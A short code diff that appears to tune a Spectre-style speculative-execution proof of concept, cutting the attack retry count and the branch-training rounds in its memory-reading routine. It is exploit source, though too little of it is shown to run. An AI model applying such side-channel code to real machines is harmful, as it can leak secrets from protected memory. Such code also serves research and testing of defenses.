@@ -156,7 +156,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     results[i] = 0;
 
   // BYTE EXECUTION ROUNDS
-  for (tries = 1999; tries > 0; tries--) {
+  for (tries = 999; tries > 0; tries--) {
 
 #ifndef NOCLFLUSH
     /* Flush array2[512*(0..255)] from cache */
@@ -174,7 +174,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     training_x = tries % array1_size;
     // TRAINING ROUNDS
     // ALWAYS KEEP MULTIPLE OF 6: (29, 59, 119, 299, ...)
-    for (j = 59; j >= 0; j--) {
+    for (j = 29; j >= 0; j--) {
 #ifndef NOCLFLUSH
       _mm_clflush( & array1_size);
 #else
